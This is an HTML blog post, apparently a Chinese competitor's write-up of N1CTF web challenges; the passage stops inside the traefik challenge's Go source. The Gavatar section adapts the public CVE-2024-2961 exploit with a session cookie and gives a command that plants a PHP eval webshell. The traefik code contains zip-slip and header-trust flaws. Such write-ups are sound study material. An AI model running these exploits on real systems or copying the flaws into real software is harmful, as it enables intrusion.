@@ -1,0 +1,832 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/tuyi/img/tuyi.jpg">
+  <link rel="icon" href="/tuyi/img/tuyi.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="tuyi">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="n1ctfwebn1战队的招新赛，题目都非常有深度，平时的知识点但是很深入，写之前还抱有一丝进入战队的幻想，拼尽全力无法战胜 全是大佬 写出4题其中Easydb是在23：08写出提交 Gavatar写了很久，一直以为是上传文件，有任意文件读取，但是那个权限实在没法绕	 后面突然想起这是LFI那是不是可以利用去年那个cve，结果就成了 ^_^ LFI到RCE感谢kengwang师傅让我了解 现在分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="n1ctf">
+<meta property="og:url" content="https://blog.tuyiisxp.top/2025/02/09/n1ctf/index.html">
+<meta property="og:site_name" content="tuyi的小站">
+<meta property="og:description" content="n1ctfwebn1战队的招新赛，题目都非常有深度，平时的知识点但是很深入，写之前还抱有一丝进入战队的幻想，拼尽全力无法战胜 全是大佬 写出4题其中Easydb是在23：08写出提交 Gavatar写了很久，一直以为是上传文件，有任意文件读取，但是那个权限实在没法绕	 后面突然想起这是LFI那是不是可以利用去年那个cve，结果就成了 ^_^ LFI到RCE感谢kengwang师傅让我了解 现在分析">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250209224407146.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250209210831989.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250209212939429.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250209213519539.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250209213900279.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/d7d936edd931ff0b32322c3228fe769a.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/d720cfebd70d29e1289e1429f571c8cd.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250210235408861.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250210224050126.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/c7896c977a222bee80520fb8f7e7cb58.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250210233304791.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250210234642888.png">
+<meta property="article:published_time" content="2025-02-09T12:52:55.000Z">
+<meta property="article:modified_time" content="2025-02-11T01:48:28.948Z">
+<meta property="article:author" content="tuyi">
+<meta property="article:tag" content="比赛">
+<meta property="article:tag" content="zip上传">
+<meta property="article:tag" content="linux越权">
+<meta property="article:tag" content="xss">
+<meta property="article:tag" content="CVE-2024-2961">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250209224407146.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>n1ctf - tuyi的小站</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/tuyi/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/tuyi/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/tuyi/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/tuyi/css/custom.css">
+<link rel="stylesheet" href="/tuyi/css/reward.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"blog.tuyiisxp.top","root":"/tuyi/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/tuyi/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/tuyi/js/utils.js" ></script>
+  <script  src="/tuyi/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/tuyi/">
+      <strong>tuyi的小站</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tuyi/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tuyi/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tuyi/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tuyi/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tuyi/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/tuyi/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="n1ctf"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-02-09 20:52" pubdate>
+          2025年2月9日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          21 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">n1ctf</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2025年2月11日 上午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="n1ctf"><a href="#n1ctf" class="headerlink" title="n1ctf"></a>n1ctf</h1><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><p>n1战队的招新赛，题目都非常有深度，平时的知识点但是很深入，写之前还抱有一丝进入战队的幻想，拼尽全力无法战胜</p>
+<p>全是大佬</p>
+<p><strong>写出4题其中<code>Easydb</code>是在<code>23：08</code>写出提交</strong></p>
+<h2 id="Gavatar"><a href="#Gavatar" class="headerlink" title="Gavatar"></a>Gavatar</h2><p>写了很久，一直以为是上传文件，有任意文件读取，但是那个权限实在没法绕	</p>
+<p>后面突然想起这是LFI那是不是可以利用去年那个cve，结果就成了 ^_^</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/14127">LFI到RCE</a>感谢<a target="_blank" rel="noopener" href="https://blog.kengwang.com.cn/archives/640/?replyTo=535">kengwang</a>师傅让我了解</p>
+<p>现在分析一下我的思路</p>
+<p>分析源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php">upload.php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;common.php&#x27;</span>;<br><br><span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">getCurrentUser</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$user</span>) <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: index.php&#x27;</span>);<br><br><span class="hljs-variable">$avatarDir</span> = <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/avatars&#x27;</span>;<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$avatarDir</span>)) <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$avatarDir</span>, <span class="hljs-number">0755</span>);<br><br><span class="hljs-variable">$avatarPath</span> = <span class="hljs-string">&quot;<span class="hljs-subst">$avatarDir</span>/<span class="hljs-subst">&#123;$user[&#x27;id&#x27;]&#125;</span>&quot;</span>;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;avatar&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$finfo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">finfo</span>(FILEINFO_MIME_TYPE);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$finfo</span>-&gt;<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;avatar&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]), [<span class="hljs-string">&#x27;image/jpeg&#x27;</span>, <span class="hljs-string">&#x27;image/png&#x27;</span>, <span class="hljs-string">&#x27;image/gif&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid file type&#x27;</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;avatar&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$avatarPath</span>);<br>&#125; <span class="hljs-keyword">elseif</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$image</span> = @<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$image</span> === <span class="hljs-literal">false</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid URL&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$avatarPath</span>, <span class="hljs-variable">$image</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: profile.php&#x27;</span>);<br><br></code></pre></td></tr></table></figure>
+
+<p>首先看到一个文件上传，一个<code>file_get_contents</code>函数</p>
+<p>文件上传那块测了很久，结果mime类型一直错，倒是<code>file_get_contents</code>可以任意文件读取</p>
+<p>拿到了一些东西</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;users&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;3522418a-e150-41b3-9a7d-ac41d3f4576a&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$2y$10$TJqRZATYatGq16hhzgFNye.mJ83nblneeHXFFIArCsInETF1l2IXy&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>但是没啥用，卡了几个小时</p>
+<p><strong>正确方法：</strong></p>
+<p>LFI to RCE</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ddd-flag">具体原理参考</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py">脚本地址</a></p>
+<p>把Romote类改成这样—-注意用户名和cookie替换成自己的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, url: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-variable language_">self</span>.url = url<br>        <span class="hljs-variable language_">self</span>.session = Session()<br>        <span class="hljs-variable language_">self</span>.session.headers = &#123;<br>            <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&quot;</span>,<br>            <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;PHPSESSID=3b3e88b173b7a66ef0d737c1d6dd92b6&quot;</span>&#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; Response:<br>        <span class="hljs-string">&quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(path)<br>        files = &#123;<br>        <span class="hljs-string">&quot;avatar&quot;</span>: (<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">b&quot;&quot;</span>, <span class="hljs-string">&quot;application/octet-stream&quot;</span>),  <span class="hljs-comment"># 空文件</span><br>        <span class="hljs-string">&quot;url&quot;</span>: (<span class="hljs-literal">None</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;path&#125;</span>&quot;</span>),  <span class="hljs-comment"># 普通字段</span><br>        &#125;<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;url:  <span class="hljs-subst">&#123;self.url&#125;</span>&quot;</span>)<br>        req1=<span class="hljs-variable language_">self</span>.session.post(<span class="hljs-variable language_">self</span>.url+<span class="hljs-string">&quot;/upload.php&quot;</span>, files=files)<br>        req2=<span class="hljs-variable language_">self</span>.session.get(<span class="hljs-variable language_">self</span>.url+<span class="hljs-string">&quot;/avatar.php?user=admin&quot;</span>)<br>        <span class="hljs-keyword">return</span> req2<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">mysend</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; Response:<br>        <span class="hljs-string">&quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(path)<br>        req=<span class="hljs-variable language_">self</span>.session.get(<span class="hljs-variable language_">self</span>.url+<span class="hljs-string">&quot;/avatar.php?user=admin&quot;</span>)<br>        <span class="hljs-keyword">return</span> req<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;Returns the contents of a remote file.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        path = <span class="hljs-string">f&quot;php://filter/convert.base64-encode/resource=<span class="hljs-subst">&#123;path&#125;</span>&quot;</span><br>        <span class="hljs-built_in">print</span>(path)<br>        response = <span class="hljs-variable language_">self</span>.send(path)<br>        data = response.re.search(<span class="hljs-string">b&quot;(.*)&quot;</span>, flags=re.S).group(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">return</span> base64.decode(data)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(e)<br>            <span class="hljs-keyword">return</span> data<br></code></pre></td></tr></table></figure>
+
+<p>运行poc</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 exp.py http://39.106.16.204:12626/ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;?=@eval(\$_POST[0]);?&gt;&#x27;</span> &gt; 1.php<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>然后访问1.php POST传参</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250209224407146.png" srcset="/tuyi/img/loading.gif" lazyload alt="image-20250209224407146"></p>
+<h2 id="traefik"><a href="#traefik" class="headerlink" title="traefik"></a>traefik</h2><p>源码</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>	<span class="hljs-string">&quot;archive/zip&quot;</span><br>	<span class="hljs-string">&quot;fmt&quot;</span><br>	<span class="hljs-string">&quot;io&quot;</span><br>	<span class="hljs-string">&quot;net/http&quot;</span><br>	<span class="hljs-string">&quot;os&quot;</span><br>	<span class="hljs-string">&quot;path/filepath&quot;</span><br>	<span class="hljs-string">&quot;strings&quot;</span><br><br>	<span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br>	<span class="hljs-string">&quot;github.com/google/uuid&quot;</span><br>)<br><br><span class="hljs-keyword">const</span> uploadDir = <span class="hljs-string">&quot;./uploads&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">unzipSimpleFile</span><span class="hljs-params">(file *zip.File, filePath <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">error</span> &#123;<br>	outFile, err := os.Create(filePath)<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		<span class="hljs-keyword">return</span> err<br>	&#125;<br>	<span class="hljs-keyword">defer</span> outFile.Close()<br><br>	fileInArchive, err := file.Open()<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		<span class="hljs-keyword">return</span> err<br>	&#125;<br>	<span class="hljs-keyword">defer</span> fileInArchive.Close()<br><br>	_, err = io.Copy(outFile, fileInArchive)<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		<span class="hljs-keyword">return</span> err<br>	&#125;<br>	<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">unzipFile</span><span class="hljs-params">(zipPath, destDir <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">error</span> &#123;<br>	zipReader, err := zip.OpenReader(zipPath)<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		<span class="hljs-keyword">return</span> err<br>	&#125;<br>	<span class="hljs-keyword">defer</span> zipReader.Close()<br><br>	<span class="hljs-keyword">for</span> _, file := <span class="hljs-keyword">range</span> zipReader.File &#123;<br>		filePath := filepath.Join(destDir, file.Name)<br>		<span class="hljs-keyword">if</span> file.FileInfo().IsDir() &#123;<br>			<span class="hljs-keyword">if</span> err := os.MkdirAll(filePath, file.Mode()); err != <span class="hljs-literal">nil</span> &#123;<br>				<span class="hljs-keyword">return</span> err<br>			&#125;<br>		&#125; <span class="hljs-keyword">else</span> &#123;<br>			err = unzipSimpleFile(file, filePath)<br>			<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>				<span class="hljs-keyword">return</span> err<br>			&#125;<br>		&#125;<br>	&#125;<br>	<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">randFileName</span><span class="hljs-params">()</span></span> <span class="hljs-type">string</span> &#123;<br>	<span class="hljs-keyword">return</span> uuid.New().String()<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>	r := gin.Default()<br>	r.LoadHTMLGlob(<span class="hljs-string">&quot;templates/*&quot;</span>)<br><br>	r.GET(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>		xForwardedFor := c.GetHeader(<span class="hljs-string">&quot;X-Forwarded-For&quot;</span>)<br><br>		<span class="hljs-keyword">if</span> !strings.Contains(xForwardedFor, <span class="hljs-string">&quot;127.0.0.1&quot;</span>) &#123;<br>			c.JSON(<span class="hljs-number">400</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;only localhost can get flag&quot;</span>&#125;)<br>			<span class="hljs-keyword">return</span><br>		&#125;<br><br>		flag := os.Getenv(<span class="hljs-string">&quot;FLAG&quot;</span>)<br>		<span class="hljs-keyword">if</span> flag == <span class="hljs-string">&quot;&quot;</span> &#123;<br>			flag = <span class="hljs-string">&quot;flag&#123;testflag&#125;&quot;</span><br>		&#125;<br><br>		c.String(http.StatusOK, flag)<br>	&#125;)<br><br>	r.GET(<span class="hljs-string">&quot;/public/index&quot;</span>, <span class="hljs-function"><span 